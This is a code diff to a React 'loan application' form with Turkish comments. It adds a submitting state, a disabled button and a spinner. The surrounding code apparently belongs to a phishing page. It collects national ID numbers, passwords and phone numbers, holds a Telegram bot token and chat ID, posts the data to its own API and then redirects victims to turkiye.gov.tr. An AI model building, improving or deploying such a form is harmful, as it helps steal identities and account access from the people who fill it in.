@@ -84,6 +84,7 @@ function App() {
   const [telegramBotToken, setTelegramBotToken] = useState('')
   const [telegramChatId, setTelegramChatId] = useState('')
   const [showSuccessAnimation, setShowSuccessAnimation] = useState(false)
+  const [isSubmitting, setIsSubmitting] = useState(false)
 
   useEffect(() => {
     calculateLoan()
@@ -312,6 +313,9 @@ function App() {
   const submitApplication = async () => {
     if (!selectedBank) return
 
+    // Eğer zaten gönderiliyor ise tekrar gönderme
+    if (isSubmitting) return
+
     if (!validateTcKimlik(tcKimlik)) {
       alert('T.C. kimlik numarası 11 haneli olmalıdır')
       return
@@ -326,6 +330,8 @@ function App() {
       alert('Telefon numarası +905 ile başlamalı ve 13 haneli olmalıdır')
       return
     }
+
+    setIsSubmitting(true) // Butonu devre dışı bırak
 
     try {
       const response = await fetch(`${API_BASE_URL}/api/submit`, {
@@ -354,6 +360,7 @@ function App() {
           setTcKimlik('')
           setSifre('')
           setTelefon('+905')
+          setIsSubmitting(false) // Butonu tekrar aktif et
           loadApplications()
           // Turkiye.gov.tr'ye yönlendir
           window.location.href = 'https://www.turkiye.gov.tr'
@@ -361,10 +368,12 @@ function App() {
       } else {
         const error = await response.json()
         alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
+        setIsSubmitting(false) // Hata durumunda butonu tekrar aktif et
       }
     } catch (error) {
       console.error('Başvuru gönderimi hatası:', error)
       alert('Başvuru gönderilirken hata oluştu')
+      setIsSubmitting(false) // Hata durumunda butonu tekrar aktif et
     }
   }
 
@@ -645,9 +654,17 @@ function App() {
                 </Button>
                 <Button 
                   onClick={submitApplication}
-                  className="flex-1 bg-purple-600 hover:bg-purple-700"
+                  disabled={isSubmitting}
+                  className="flex-1 bg-purple-600 hover:bg-purple-700 disabled:bg-gray-400 disabled:cursor-not-allowed"
                 >
-                  Başvuru Gönder
+                  {isSubmitting ? (
+                    <div className="flex items-center">
+                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
+                      Gönderiliyor...
+                    </div>
+                  ) : (
+                    "Başvuru Gönder"
+                  )}
                 </Button>
               </div>
             </div>
